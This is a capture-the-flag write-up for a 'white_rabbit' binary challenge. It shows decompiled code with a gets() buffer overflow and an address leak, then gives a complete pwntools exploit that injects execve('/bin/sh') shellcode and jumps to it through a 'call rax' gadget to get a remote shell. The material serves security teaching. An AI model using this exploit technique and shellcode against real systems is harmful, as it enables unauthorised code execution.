We are given a binary file. Decompile it we have:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("\n  (\\_/)");
  puts(asc_200D);
  printf("  / > %p\n\n", main);
  puts("follow the white rabbit...");
  follow();
  return 0;
}
```

It gives us the address of `main` function, so we can get the stack leak here. Decompile the `follow()` function: 

```c
void __fastcall follow()
{
  char buf[100]; // [rsp+0h] [rbp-70h] BYREF

  gets((__int64)buf);
}
```

so a Buffer Overflow here for us to exploit. Because there is no libc here, so im thinking about ret2system or ret2shellcode. But there is no gadgets for me. For ret2shellcode, i need to find gadget 'call rax' and then find the offset to the value where `rax` points to.

![image](https://hackmd.io/_uploads/H13l-Sn7Jl.png)

Luckily, there is a gadget here. 
Script: 
```python!
#!/usr/bin/env python3
from pwn import *

exe = ELF("./white_rabbit")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("whiterabbit.chal.wwctf.com", 1337)

    return r
def main():
	r = conn()
	input()
	r.recvuntil(b'> ')
	bin_leak = int(r.recv(14), 16)
	info('Leak: ' + hex(bin_leak))
	exe.address = bin_leak - exe.sym['main']
	info('Sym main: ' + hex(exe.address))
	shellcode = asm(
		'''
		mov rax, 0x3b
		mov rdi, 29400045130965551
		push rdi
		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		syscall
		''', arch='amd64')
	call_rax = exe.address + 0x0000000000001014
	payload = shellcode + b'A'*91 + p64(call_rax)
	r.sendlineafter(b'follow the white rabbit...\n', payload)
	r.interactive()

if __name__ == "__main__":
    main() 
```
